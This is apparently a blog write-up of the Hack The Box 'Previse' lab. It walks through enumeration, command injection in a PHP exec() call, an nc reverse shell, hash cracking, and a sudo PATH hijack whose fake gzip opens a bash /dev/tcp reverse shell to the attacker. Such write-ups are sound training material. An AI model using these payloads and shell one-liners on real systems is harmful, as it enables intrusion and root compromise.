---
title: "HTB Previse"
date: 2026-01-06 15:00:00 +1100
categories: [Hack The Box]
tags: [Command Injection, MD5-Crypt, Hashcat, Sudo Path Hijacking, Linux Privilege Escalation]
image:
  path: /assets/img/Previse/icon.png
---
Previse is a easy machine that showcases Execution After Redirect (EAR) which allows users to retrieve the contents and make requests to `accounts.php` whilst unauthenticated which leads to abusing PHP&amp;amp;amp;amp;#039;s `exec()` function since user inputs are not sanitized allowing remote code execution against the target, after gaining a www-data shell privilege escalation starts with the retrieval and cracking of a custom MD5Crypt hash which consists of a unicode salt and once cracked allows users to gain SSH access to the target then abusing a sudo executable script which does not include absolute paths of the functions it utilises which allows users to perform PATH hijacking on the target to compromise the machine.

# Nmap

```shell
└─$ nmap -sC -sV -T4 10.129.95.185     
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-06 15:07 AEDT
Nmap scan report for 10.129.95.185
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Previse Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

If we browse to the web page, it appears to be a standard login screen.

![img](/assets/img/Previse/1.png)

---

# Directory Enumeration
```shell
feroxbuster -u http://10.129.95.185  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php 
                                                                                                                    
___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.95.185/
 🚩  In-Scope Url          │ 10.129.95.185
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET       71l      164w     2801c http://10.129.95.185/index.php => login.php
200      GET        1l        1w      263c http://10.129.95.185/site.webmanifest
302      GET        0l        0w        0c http://10.129.95.185/logout.php => login.php
302      GET       81l      210w     3441c http://10.129.95.185/file_logs.php => login.php
302      GET      112l      263w     4914c http://10.129.95.185/files.php => login.php
302      GET       74l      176w     2966c http://10.129.95.185/status.php => login.php
200      GET        3l     4821w    65009c http://10.129.95.185/js/uikit-icons.min.js
200      GET        1l     4285w   274772c http://10.129.95.185/css/uikit.min.css
302      GET        0l        0w        0c http://10.129.95.185/download.php => login.php
302      GET       93l      238w     3994c http://10.129.95.185/accounts.php => login.php
200      GET        6l       17w     1258c http://10.129.95.185/favicon-16x16.png
200      GET        6l       39w     3031c http://10.129.95.185/favicon-32x32.png
200      GET       57l      337w    25229c http://10.129.95.185/apple-touch-icon.png
200      GET       10l       39w    29694c http://10.129.95.185/favicon.ico
200      GET       53l      138w     2224c http://10.129.95.185/login.php
200      GET        3l     2219w   133841c http://10.129.95.185/js/uikit.min.js
200      GET       20l       64w      980c http://10.129.95.185/header.php
200      GET       31l       60w     1248c http://10.129.95.185/nav.php
302      GET       71l      164w     2801c http://10.129.95.185/ => login.php
200      GET        5l       14w      217c http://10.129.95.185/footer.php
301      GET        9l       28w      312c http://10.129.95.185/css => http://10.129.95.185/css/
301      GET        9l       28w      311c http://10.129.95.185/js => http://10.129.95.185/js/
200      GET        0l        0w        0c http://10.129.95.185/config.php
302      GET        0l        0w        0c http://10.129.95.185/logs.php => login.php
[#######>------------] - 9m     78129/220574  15m     found:24      errors:0      
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_129_95_185_-1767673228.state ...
[#######>------------] - 9m     78132/220574  15m     found:24      errors:0      
[###>----------------] - 9m     39035/220546  76/s    http://10.129.95.185/ 
[####################] - 2s    220546/220546  111612/s http://10.129.95.185/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s    220546/220546  132460/s http://10.129.95.185/js/ => Directory listing (add --scan-dir-listings to scan)                                                                                                                                                                                                                      
```

*(output unchanged)*

From the scan results, we can see that several pages return **302 redirects**, but importantly, those redirects still return **non-zero response sizes**. This suggests that the pages may still be accessible directly.

Browsing to `accounts.php` confirms this.

![img](/assets/img/Previse/2.png)

---

We can create a new account:

![img](/assets/img/Previse/3.png)

After creating the account, we are logged in and presented with a dashboard that includes a site backup feature.

![img](/assets/img/Previse/4.png)

---

# Inspecting the logs functionality

Reviewing the source code, `logs.php` stands out.

```shell
└─$ cat logs.php     
<?php
session_start();
if (!isset($_SESSION['user'])) {
    header('Location: login.php');
    exit;
}
?>

<?php
if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Location: login.php');
    exit;
}

//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

$filepath = "/var/www/out.log";
$filename = "out.log";    
...
```

The key issue here is that `$_POST['delim']` is passed **directly into `exec()`** without sanitisation.

---

# Command Injection

We can test this by sending a POST request and attempting a callback.

```http
POST /logs.php HTTP/1.1
Host: 10.129.95.185
...
delim=tab;curl+http://10.10.14.30
```

Callback received:

```php
10.129.95.185 - - [06/Jan/2026 15:33:27] "GET / HTTP/1.1" 200 -
```

This confirms command execution.

---

# Shell Access

We now upgrade this to a reverse shell.

```shell
delim=tab;nc%20-c%20bash%2010.10.14.30%204444
```

Listener:

```shell
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.30] from (UNKNOWN) [10.129.95.185] 43720

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We now have a shell as `www-data`.

---

# Database

Inspecting the web directory reveals database credentials.

```shell
www-data@previse:/var/www/html$ cat config.php 
<?php
function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}
?>
```

Using these credentials, we dump the database:

```shell
mysql> select * from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | testuser | $1$🧂llol$FbsumqZUt.kJRCYaWurtw0 | 2026-01-06 04:24:46 |
+----+----------+------------------------------------+---------------------+
```

---

# Hash Crack

The hash format is:

* `$1$` → MD5-Crypt
* `🧂llol` → salt
* remaining value → hashed output

Cracking with Hashcat:

```shell
hashcat -m 500 -a 0 hashes.txt rockyou.txt --show
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
```

---

# SSH

```shell
└─$ ssh m4lwhere@10.129.95.185
m4lwhere@previse:~$ cat user.txt
a4d0c723764936fcc8f7b9b4ca033d5f
```

---

# Priv Esc

Checking sudo permissions:

```shell
m4lwhere@previse:~$ sudo -l
(root) /opt/scripts/access_backup.sh
```

Script contents:

```shell
gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

The script calls `gzip` **without an absolute path**, making it vulnerable to PATH hijacking.

---

# PATH hijack 

```shell
PATH=.:${PATH}
export PATH
```

Create a malicious `gzip` binary:

```shell
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.30/4444 0>&1
```

Execute the script:

```shell
sudo /opt/scripts/access_backup.sh
```

Listener:

```shell
root@previse:~# cat /root/root.txt
55921870fc13da152b2390872e5f6857
```


